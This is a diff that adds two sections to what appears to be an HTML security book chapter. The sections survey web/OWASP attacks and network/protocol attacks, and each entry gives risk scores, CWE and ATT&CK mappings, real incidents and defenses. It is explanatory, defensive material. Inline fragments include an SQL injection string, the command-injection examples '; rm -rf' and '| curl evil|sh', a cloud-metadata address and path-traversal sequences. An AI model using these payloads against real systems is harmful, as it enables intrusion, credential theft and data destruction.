@@ -491,8 +491,314 @@
     <p class="fix"><b>Defense</b> Patch browsers and plugins aggressively; use modern browsers&rsquo; sandboxing; network egress filtering and EDR to catch the post-exploit stage; isolate high-risk browsing.</p>
   </div>
 
+  <h2 id="part5">Part V &mdash; Web &amp; Application Attacks</h2>
+  <p>The web is the largest attack surface in the world, and the <strong>OWASP Top 10</strong> is its canonical hit list &mdash; the ten most critical categories of web-application risk, updated every few years (the 2021 list leads with Broken Access Control). These attacks target the application&rsquo;s own logic, so they sail straight past the network firewall; many map to a CWE weakness and an OWASP category more cleanly than to MITRE ATT&amp;CK, and the entries say so.</p>
+
+  <div class="attack">
+    <h3>SQL Injection (SQLi)</h3>
+    <div class="panel r-crit">
+      <span class="rr">RISK 9</span>
+      <span class="m">Popularity <b>8</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>7</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>10</b></span><span class="sep">&middot;</span>
+      <span class="att">CWE-89 / OWASP A03 / T1190</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS High&ndash;Critical</span>
+    </div>
+    <p class="how">The classic. When an application builds a database query by pasting user input straight into it, an attacker types SQL <em>as</em> the input &mdash; <code>' OR '1'='1</code> and its endless descendants &mdash; and the database executes it. The result ranges from dumping the entire user table to bypassing login to, in the worst case, running commands on the database server. Automated tools like <code>sqlmap</code> make exploitation point-and-click. It has been near the top of the list for over two decades and refuses to die, because new code keeps making the same mistake.</p>
+    <p class="seen"><b>In the wild:</b> Albert Gonzalez&rsquo;s crew (Chapter 2) used SQL injection to steal 170+ million payment cards from TJX and Heartland &mdash; at the time the largest such theft in history.</p>
+    <p class="fix"><b>Defense</b> Parameterized queries / prepared statements, always &mdash; never build queries by string concatenation. Use an ORM correctly, apply least-privilege database accounts, and add a WAF as a backstop, not a substitute.</p>
+  </div>
+
+  <div class="attack">
+    <h3>Cross-Site Scripting (XSS)</h3>
+    <div class="panel r-high">
+      <span class="rr">RISK 8</span>
+      <span class="m">Popularity <b>9</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>7</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>7</b></span><span class="sep">&middot;</span>
+      <span class="att">CWE-79 / OWASP A03</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS Medium&ndash;High</span>
+    </div>
+    <p class="how">The application reflects attacker-supplied input back into a page without sanitizing it, so the attacker&rsquo;s JavaScript runs in the victim&rsquo;s browser, in the victim&rsquo;s session. Three flavors: <strong>reflected</strong> (the payload is in a crafted link), <strong>stored</strong> (the payload is saved on the server and served to every visitor &mdash; the worst), and <strong>DOM-based</strong> (the flaw is in client-side JavaScript). Impact: stolen session cookies, keylogging, account takeover, or a self-propagating worm.</p>
+    <p class="seen"><b>In the wild:</b> Samy Kamkar&rsquo;s 2005 MySpace worm (Chapter 2) was stored XSS &mdash; a million &ldquo;friends&rdquo; in under a day, the fastest-spreading worm to that point.</p>
+    <p class="fix"><b>Defense</b> Context-aware output encoding; a strict Content-Security-Policy; sanitize rich input with a vetted library; mark cookies <code>HttpOnly</code> so script can&rsquo;t read them.</p>
+  </div>
+
+  <div class="attack">
+    <h3>Cross-Site Request Forgery (CSRF)</h3>
+    <div class="panel r-med">
+      <span class="rr">RISK 6</span>
+      <span class="m">Popularity <b>6</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>6</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>6</b></span><span class="sep">&middot;</span>
+      <span class="att">CWE-352 / OWASP A01</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS Medium</span>
+    </div>
+    <p class="how">The attacker tricks a logged-in victim&rsquo;s browser into silently sending a state-changing request to a site where they&rsquo;re authenticated &mdash; &ldquo;transfer money,&rdquo; &ldquo;change email&rdquo; &mdash; by hiding it in an image tag or auto-submitting form on an attacker page. The victim&rsquo;s cookies ride along automatically, so the server thinks the request is legitimate. Less common now thanks to framework defenses, but devastating where it survives.</p>
+    <p class="seen"><b>In the wild:</b> CSRF flaws in home routers have let malicious web pages silently rewrite DNS settings, redirecting all of a victim&rsquo;s traffic.</p>
+    <p class="fix"><b>Defense</b> Anti-CSRF tokens (most frameworks include them); <code>SameSite</code> cookie attribute; require re-authentication for sensitive actions.</p>
+  </div>
+
+  <div class="attack">
+    <h3>Server-Side Request Forgery (SSRF)</h3>
+    <div class="panel r-high">
+      <span class="rr">RISK 8</span>
+      <span class="m">Popularity <b>7</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>6</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>9</b></span><span class="sep">&middot;</span>
+      <span class="att">CWE-918 / OWASP A10</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS High&ndash;Critical</span>
+    </div>
+    <p class="how">The attacker makes the <em>server</em> make a request on their behalf to a destination they choose. If the app fetches a URL the user supplies, the attacker points it inward &mdash; at internal services, or at the cloud metadata endpoint (<code>169.254.169.254</code>) that hands out temporary cloud credentials. SSRF is the hinge that turns a web flaw into a full cloud compromise (Part XV), which is why it climbed onto the OWASP Top 10.</p>
+    <p class="seen"><b>In the wild:</b> the 2019 Capital One breach (100+ million records) chained an SSRF flaw to the AWS metadata service to steal credentials and loot an S3 bucket.</p>
+    <p class="fix"><b>Defense</b> Allow-list outbound destinations; block requests to internal/link-local ranges; enforce IMDSv2 (session-token metadata) in AWS; isolate the fetching service.</p>
+  </div>
+
+  <div class="attack">
+    <h3>Command Injection</h3>
+    <div class="panel r-crit">
+      <span class="rr">RISK 9</span>
+      <span class="m">Popularity <b>7</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>7</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>10</b></span><span class="sep">&middot;</span>
+      <span class="att">CWE-78 / OWASP A03 / T1059</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS Critical</span>
+    </div>
+    <p class="how">Like SQLi, but the user input is pasted into a shell command the server runs, so the attacker appends their own commands (<code>; rm -rf</code>, <code>| curl evil|sh</code>) and achieves direct remote code execution on the host &mdash; the highest-impact web outcome there is. Common in appliances, routers, and apps that shell out to system utilities.</p>
+    <p class="seen"><b>In the wild:</b> command-injection flaws in internet-facing appliances and routers are a recurring source of botnet recruitment and ransomware initial access.</p>
+    <p class="fix"><b>Defense</b> Never pass user input to a shell; use language APIs with argument arrays instead of a command string; strict input validation; run the service with minimal privilege.</p>
+  </div>
+
+  <div class="attack">
+    <h3>Broken Access Control &amp; IDOR</h3>
+    <div class="panel r-crit">
+      <span class="rr">RISK 9</span>
+      <span class="m">Popularity <b>9</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>8</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>8</b></span><span class="sep">&middot;</span>
+      <span class="att">CWE-639 / OWASP A01</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS High</span>
+    </div>
+    <p class="how">The number-one web risk on the 2021 OWASP list. The app fails to check that the logged-in user is <em>allowed</em> to do what they&rsquo;re asking. The simplest form &mdash; <strong>Insecure Direct Object Reference (IDOR)</strong> &mdash; is changing <code>/account?id=1001</code> to <code>1002</code> and seeing someone else&rsquo;s data. Broader forms let a normal user hit admin functions or escalate their role. It requires almost no skill, which is why it&rsquo;s everywhere.</p>
+    <p class="seen"><b>In the wild:</b> IDOR flaws have exposed millions of records at major platforms by letting anyone iterate an ID in a URL or API call.</p>
+    <p class="fix"><b>Defense</b> Enforce authorization on the server for <em>every</em> request, checking the object belongs to the caller; deny by default; use unguessable identifiers as defense-in-depth, never as the control itself.</p>
+  </div>
+
+  <div class="attack">
+    <h3>XML External Entity (XXE) Injection</h3>
+    <div class="panel r-high">
+      <span class="rr">RISK 7</span>
+      <span class="m">Popularity <b>5</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>5</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>9</b></span><span class="sep">&middot;</span>
+      <span class="att">CWE-611 / OWASP A05</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS High</span>
+    </div>
+    <p class="how">A poorly-configured XML parser that resolves &ldquo;external entities&rdquo; can be fed a document that makes it read local files (<code>/etc/passwd</code>), reach internal systems (an SSRF pivot), or exhaust resources. Declining because modern parsers disable the feature by default, but still found in enterprise and legacy apps that accept XML, SOAP, or SAML.</p>
+    <p class="seen"><b>In the wild:</b> XXE has been used to read server-side secrets and source code from document-processing and SAML single-sign-on endpoints.</p>
+    <p class="fix"><b>Defense</b> Disable external-entity and DTD processing in every XML parser; prefer JSON where you can; patch and configure SAML/SOAP stacks correctly.</p>
+  </div>
+
+  <div class="attack">
+    <h3>Insecure Deserialization</h3>
+    <div class="panel r-high">
+      <span class="rr">RISK 8</span>
+      <span class="m">Popularity <b>5</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>4</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>10</b></span><span class="sep">&middot;</span>
+      <span class="att">CWE-502 / OWASP A08</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS Critical</span>
+    </div>
+    <p class="how">Applications often serialize objects to store or transmit them; if the server deserializes attacker-controlled data without care, a crafted payload can instantiate dangerous objects and achieve remote code execution. Harder to find and build than SQLi, but frequently catastrophic when it lands, and common in Java, PHP, Python (<code>pickle</code>), and .NET.</p>
+    <p class="seen"><b>In the wild:</b> deserialization flaws have produced critical RCE in widely-used Java frameworks and middleware, exploited in the wild within days of disclosure.</p>
+    <p class="fix"><b>Defense</b> Never deserialize untrusted data; if you must, use a format and library without code-execution gadgets, sign/verify the data, and allow-list permitted classes.</p>
+  </div>
+
+  <div class="attack">
+    <h3>Server-Side Template Injection (SSTI)</h3>
+    <div class="panel r-high">
+      <span class="rr">RISK 7</span>
+      <span class="m">Popularity <b>4</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>4</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>10</b></span><span class="sep">&middot;</span>
+      <span class="att">CWE-1336 / OWASP A03</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS Critical</span>
+    </div>
+    <p class="how">When user input is embedded into a server-side template (Jinja2, Twig, Freemarker, Velocity) and evaluated, the attacker injects template syntax that the engine executes &mdash; often a direct path to remote code execution via the template language&rsquo;s object model. A specialist&rsquo;s bug, but a devastating one, especially in apps that let users customize emails, reports, or themes.</p>
+    <p class="seen"><b>In the wild:</b> SSTI has yielded RCE in numerous bug-bounty findings against major platforms that templated user-supplied content.</p>
+    <p class="fix"><b>Defense</b> Never let user input reach template <em>code</em>; pass it only as sandboxed data/variables; use logic-less templates where possible.</p>
+  </div>
+
+  <div class="attack">
+    <h3>Unrestricted File Upload</h3>
+    <div class="panel r-high">
+      <span class="rr">RISK 7</span>
+      <span class="m">Popularity <b>7</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>6</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>9</b></span><span class="sep">&middot;</span>
+      <span class="att">CWE-434 / OWASP A04</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS High&ndash;Critical</span>
+    </div>
+    <p class="how">An upload feature that doesn&rsquo;t properly validate files lets an attacker upload a <strong>web shell</strong> &mdash; a script (<code>.php</code>, <code>.jsp</code>, <code>.aspx</code>) that, once uploaded into a web-accessible directory and requested, gives them a command interface on the server. One of the oldest and most reliable routes from &ldquo;I can upload a profile picture&rdquo; to &ldquo;I own the server.&rdquo;</p>
+    <p class="seen"><b>In the wild:</b> web shells dropped via upload flaws (and via the Exchange ProxyShell chain, Part IV) are a staple of real intrusions and a top persistence mechanism.</p>
+    <p class="fix"><b>Defense</b> Validate type by content not extension; store uploads outside the web root and serve them through a handler; rename files; disable script execution in upload directories; scan for malware.</p>
+  </div>
+
+  <div class="attack">
+    <h3>Authentication &amp; Session Flaws</h3>
+    <div class="panel r-high">
+      <span class="rr">RISK 8</span>
+      <span class="m">Popularity <b>8</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>6</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>9</b></span><span class="sep">&middot;</span>
+      <span class="att">CWE-287 / OWASP A07</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS High</span>
+    </div>
+    <p class="how">A grab-bag of ways authentication breaks: no rate-limiting (enabling the brute force of Part VIII), weak password reset flows, predictable or non-expiring session tokens, session fixation, JWT verification bugs (accepting <code>alg:none</code> or a weak key), and missing or bypassable MFA. Any one turns &ldquo;log in as me&rdquo; into &ldquo;log in as anyone.&rdquo;</p>
+    <p class="seen"><b>In the wild:</b> flawed password-reset and JWT-handling logic have produced full account-takeover findings across major web and API platforms.</p>
+    <p class="fix"><b>Defense</b> Use a vetted authentication framework, never roll your own; enforce MFA; rate-limit and lock out; generate long random session tokens, rotate them on login, and expire them; verify JWT signatures and algorithms strictly.</p>
+  </div>
+
+  <div class="attack">
+    <h3>API Attacks &amp; Broken Object-Level Authorization (BOLA)</h3>
+    <div class="panel r-crit">
+      <span class="rr">RISK 9</span>
+      <span class="m">Popularity <b>9</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>7</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>8</b></span><span class="sep">&middot;</span>
+      <span class="att">OWASP API1:2023 / CWE-639</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS High</span>
+    </div>
+    <p class="how">APIs now carry most of the world&rsquo;s data, and they have their own OWASP Top 10. The number-one API risk, <strong>BOLA</strong>, is IDOR&rsquo;s API-native twin: the endpoint returns an object by ID without checking the caller owns it, so iterating IDs over a fast, machine-readable API scrapes everyone&rsquo;s data at scale. Add excessive data exposure, missing rate limits, and &ldquo;shadow&rdquo; undocumented endpoints, and APIs become the softest large target in the modern stack.</p>
+    <p class="seen"><b>In the wild:</b> a 2022&ndash;2023 API flaw let attackers enumerate and link tens of millions of accounts at a major social platform via a single lookup endpoint.</p>
+    <p class="fix"><b>Defense</b> Authorize every object access server-side; inventory every endpoint (no shadow APIs); rate-limit and monitor for enumeration patterns; use an API gateway and schema validation.</p>
+  </div>
+
+  <div class="attack">
+    <h3>Path Traversal &amp; Security Misconfiguration</h3>
+    <div class="panel r-high">
+      <span class="rr">RISK 7</span>
+      <span class="m">Popularity <b>8</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>7</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>7</b></span><span class="sep">&middot;</span>
+      <span class="att">CWE-22 / OWASP A05</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS High</span>
+    </div>
+    <p class="how"><strong>Path traversal</strong> abuses a file parameter with <code>../../</code> sequences to escape the intended directory and read (or write) arbitrary files &mdash; configs, credentials, source. <strong>Security misconfiguration</strong> is the broader, ever-present category: default credentials left in place, verbose error pages, directory listing enabled, debug endpoints exposed, permissions too broad, cloud storage left public. Rarely glamorous, perpetually exploited, because every system has a hundred settings and only needs one wrong.</p>
+    <p class="seen"><b>In the wild:</b> the Apache path-traversal flaw of Part III (CVE-2021-41773) was mass-exploited; countless breaches trace to a single default password or a public cloud bucket.</p>
+    <p class="fix"><b>Defense</b> Canonicalize and validate file paths against an allow-list; change all defaults; disable directory listing and debug in production; harden to a benchmark (CIS); continuously scan your own config.</p>
+  </div>
+
+  <h2 id="part6">Part VI &mdash; Network &amp; Protocol Attacks</h2>
+  <p>Below the application sits the network, and its core protocols were designed decades ago for a trusted environment that no longer exists. Most of these attacks require the attacker to already be <em>on</em> the network (a foothold from Part IV, or physical/wireless access from Parts XII&ndash;XIII) &mdash; which is exactly why &ldquo;inside the perimeter&rdquo; must never equal &ldquo;trusted&rdquo; (the zero-trust lesson of Chapter 8).</p>
+
+  <div class="attack">
+    <h3>Man-in-the-Middle / Adversary-in-the-Middle (MITM/AiTM)</h3>
+    <div class="panel r-high">
+      <span class="rr">RISK 8</span>
+      <span class="m">Popularity <b>7</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>6</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>9</b></span><span class="sep">&middot;</span>
+      <span class="att">ATT&amp;CK T1557</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS High</span>
+    </div>
+    <p class="how">The attacker positions themselves between two parties and relays (and optionally alters) the traffic, so both believe they&rsquo;re talking directly. The umbrella for the next several entries. Modern AiTM phishing kits (Evilginx and kin) even defeat many forms of MFA by proxying the real login page and stealing the authenticated <em>session cookie</em>, not just the password &mdash; which is why phishing-resistant MFA (Part IV) matters so much.</p>
+    <p class="seen"><b>In the wild:</b> AiTM phishing kits that steal session tokens drove a wave of 2022&ndash;2024 business-email-compromise intrusions against MFA-protected accounts.</p>
+    <p class="fix"><b>Defense</b> Encrypt everything (TLS, HSTS); phishing-resistant MFA bound to the origin (FIDO2/passkeys); certificate validation and pinning where feasible; monitor for anomalous session use.</p>
+  </div>
+
+  <div class="attack">
+    <h3>ARP Spoofing / Poisoning</h3>
+    <div class="panel r-med">
+      <span class="rr">RISK 6</span>
+      <span class="m">Popularity <b>6</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>7</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>7</b></span><span class="sep">&middot;</span>
+      <span class="att">ATT&amp;CK T1557.002</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS Medium&ndash;High</span>
+    </div>
+    <p class="how">On a local network, ARP has no authentication, so an attacker can broadcast forged replies claiming &ldquo;the gateway&rsquo;s IP is at <em>my</em> MAC address,&rdquo; and the switch happily routes everyone&rsquo;s traffic through them &mdash; the classic way to establish a MITM on a LAN. Tools like Ettercap and Bettercap automate it in a click.</p>
+    <p class="seen"><b>In the wild:</b> a staple of internal penetration tests and of attackers who&rsquo;ve gained a foothold or physical/Wi-Fi access to a corporate LAN.</p>
+    <p class="fix"><b>Defense</b> Dynamic ARP Inspection and DHCP snooping on switches; port security; segment the network; encrypt traffic so interception yields nothing readable.</p>
+  </div>
+
+  <div class="attack">
+    <h3>LLMNR / NBT-NS Poisoning</h3>
+    <div class="panel r-high">
+      <span class="rr">RISK 7</span>
+      <span class="m">Popularity <b>8</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>7</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>8</b></span><span class="sep">&middot;</span>
+      <span class="att">ATT&amp;CK T1557.001</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS High</span>
+    </div>
+    <p class="how">A Windows-network favorite. When a machine can&rsquo;t resolve a name via DNS, it falls back to broadcasting on LLMNR/NBT-NS, trusting any answer. The tool <code>Responder</code> answers every such query &mdash; &ldquo;yes, that server is me&rdquo; &mdash; and captures the victim&rsquo;s authentication (NetNTLM hashes), which the attacker then cracks (Part VIII) or relays. It is one of the first things a tester tries on an internal engagement, and it almost always works.</p>
+    <p class="seen"><b>In the wild:</b> Responder-captured hashes, relayed or cracked, are a routine early step in real Active Directory compromises.</p>
+    <p class="fix"><b>Defense</b> Disable LLMNR and NBT-NS via group policy; enforce SMB signing to block relay; segment; alert on Responder-style activity.</p>
+  </div>
+
+  <div class="attack">
+    <h3>DNS Spoofing &amp; Cache Poisoning</h3>
+    <div class="panel r-high">
+      <span class="rr">RISK 7</span>
+      <span class="m">Popularity <b>5</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>4</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>9</b></span><span class="sep">&middot;</span>
+      <span class="att">ATT&amp;CK T1557 / T1565.002</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS High&ndash;Critical</span>
+    </div>
+    <p class="how">Corrupt the answer to &ldquo;what IP is this name?&rdquo; and you silently send victims to a server you control &mdash; for phishing, malware, or interception &mdash; while the address bar looks correct. This is the civilization-scale flaw Dan Kaminsky found and coordinated the fix for in 2008 (Chapter 2). On a local network it&rsquo;s a MITM add-on; against resolvers it&rsquo;s a far harder, far higher-impact attack.</p>
+    <p class="seen"><b>In the wild:</b> the Kaminsky flaw (2008) threatened the whole internet; router-based DNS hijacking has redirected banking traffic en masse.</p>
+    <p class="fix"><b>Defense</b> Deploy DNSSEC; use encrypted DNS (DoH/DoT); patch resolvers; protect router/DNS configuration; monitor for unexpected resolution changes.</p>
+  </div>
+
+  <div class="attack">
+    <h3>Packet Sniffing &amp; Session Hijacking</h3>
+    <div class="panel r-med">
+      <span class="rr">RISK 6</span>
+      <span class="m">Popularity <b>7</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>6</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>7</b></span><span class="sep">&middot;</span>
+      <span class="att">ATT&amp;CK T1040 / T1563</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS Medium&ndash;High</span>
+    </div>
+    <p class="how">Once in a position to see traffic (via the attacks above, or open Wi-Fi), the attacker captures it with Wireshark/tcpdump. Anything unencrypted &mdash; credentials, cookies, data &mdash; is readable, and a stolen <strong>session cookie</strong> can be replayed to hijack an authenticated session without ever knowing the password. This is the technique behind DEF CON&rsquo;s &ldquo;Wall of Sheep&rdquo; (Chapter 4).</p>
+    <p class="seen"><b>In the wild:</b> the Firesheep extension (2010) made one-click session hijacking over open Wi-Fi so trivial it shamed the whole web into adopting HTTPS everywhere.</p>
+    <p class="fix"><b>Defense</b> Encrypt all traffic (TLS/HSTS); never trust a network; mark cookies <code>Secure</code>/<code>HttpOnly</code>; bind sessions to device signals and expire them; use a VPN on hostile networks.</p>
+  </div>
+
+  <div class="attack">
+    <h3>Denial of Service (DoS / DDoS)</h3>
+    <div class="panel r-high">
+      <span class="rr">RISK 7</span>
+      <span class="m">Popularity <b>8</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>7</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>7</b></span><span class="sep">&middot;</span>
+      <span class="att">ATT&amp;CK T1498 / T1499</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS High (availability)</span>
+    </div>
+    <p class="how">Overwhelm a target with traffic or requests until it can&rsquo;t serve legitimate users. <strong>Distributed</strong> DoS uses a botnet (Part XVI) or rented &ldquo;booter&rdquo; service to generate enormous volume, often amplified by abusing protocols (DNS, NTP, memcached) that reply with far more data than the request. It attacks availability, not confidentiality &mdash; no data is stolen, but the business stops &mdash; and is often a smokescreen or an extortion lever.</p>
+    <p class="seen"><b>In the wild:</b> the 2016 Mirai botnet (Chapter 3/11) took down the Dyn DNS provider and much of the US internet with it; record DDoS attacks now exceed terabits per second.</p>
+    <p class="fix"><b>Defense</b> Upstream DDoS mitigation / scrubbing (Cloudflare, Akamai, cloud providers); rate-limiting; over-provisioning and autoscaling; disable or secure amplifiable services; have an incident plan for availability.</p>
+  </div>
+
+  <div class="attack">
+    <h3>Rogue Devices &amp; VLAN Hopping</h3>
+    <div class="panel r-med">
+      <span class="rr">RISK 5</span>
+      <span class="m">Popularity <b>5</b></span><span class="sep">&middot;</span>
+      <span class="m">Simplicity <b>5</b></span><span class="sep">&middot;</span>
+      <span class="m">Impact <b>7</b></span><span class="sep">&middot;</span>
+      <span class="att">ATT&amp;CK T1557.003 / T1200</span><span class="sep">&middot;</span>
+      <span class="cvss">CVSS Medium&ndash;High</span>
+    </div>
+    <p class="how">An attacker with physical or network access plants a rogue DHCP server (to become everyone&rsquo;s gateway), a rogue access point (Part XII), or a small implant (a Raspberry Pi, a &ldquo;drop box&rdquo;) that phones home for remote access. <strong>VLAN hopping</strong> abuses switch misconfiguration (dynamic trunking, double-tagging) to reach network segments that were supposed to be isolated &mdash; defeating segmentation from the inside.</p>
+    <p class="seen"><b>In the wild:</b> covert &ldquo;drop boxes&rdquo; are a classic red-team and insider technique; VLAN hopping has repeatedly broken the isolation between guest/IoT and corporate networks.</p>
+    <p class="fix"><b>Defense</b> 802.1X network access control; DHCP snooping; disable dynamic trunking and unused ports; proper VLAN/native-VLAN configuration; physical port security and monitoring.</p>
+  </div>
+
   <div class="wip">
-    &#9888; <strong>Compendium in progress.</strong> Parts V&ndash;XX (Web/OWASP, Network, Exploitation, Credentials, Privilege Escalation, Persistence &amp; Lateral Movement, C2 &amp; Impact, Wireless, Physical/Hardware, Mobile, Cloud/Container, OT/ICS/IoT, AI/LLM, Cryptographic, and Supply-Chain attacks, plus the closing synthesis) are being written and will appear here in the next passes, each attack with the same Threat Panel, MITRE ATT&amp;CK mapping, real-world incident, and countermeasure. This is the thickest chapter in the book and is built in installments.
+    &#9888; <strong>Compendium in progress.</strong> Parts VII&ndash;XX (Exploitation &amp; Memory Corruption, Credentials, Privilege Escalation, Persistence &amp; Lateral Movement, C2 &amp; Impact, Wireless, Physical/Hardware, Mobile, Cloud/Container, OT/ICS/IoT, AI/LLM, Cryptographic, and Supply-Chain attacks, plus the closing synthesis) are being written and will appear here in the next passes, each attack with the same Threat Panel, MITRE ATT&amp;CK mapping, real-world incident, and countermeasure. This is the thickest chapter in the book and is built in installments.
   </div>
 
   <h2 id="sources" style="border-bottom:none; margin-bottom:8px;">Sources &amp; Standards</h2>
